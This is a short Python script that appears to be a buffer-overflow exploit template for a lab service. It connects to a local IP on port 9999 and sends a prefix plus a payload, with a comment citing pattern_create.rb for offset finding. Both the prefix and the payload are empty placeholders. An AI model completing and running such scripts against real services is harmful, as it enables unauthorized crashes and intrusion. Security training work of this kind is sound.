#!/usr/bin/env python3

import socket,time,sys

ip = "192.168.0.105"
port = 9999
timeout = 5
prefix = ""
payload = "" # pattern_create.rb -l <length_of_the_payload>

string = prefix + payload
print(string)

try:
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip,port))
        s.recv(1024)
        s.send(bytes(string,"latin-1"))
        s.recv(1024)
except:
    print("Can't connect to the server")
    sys.exit(0)

time.sleep(1)
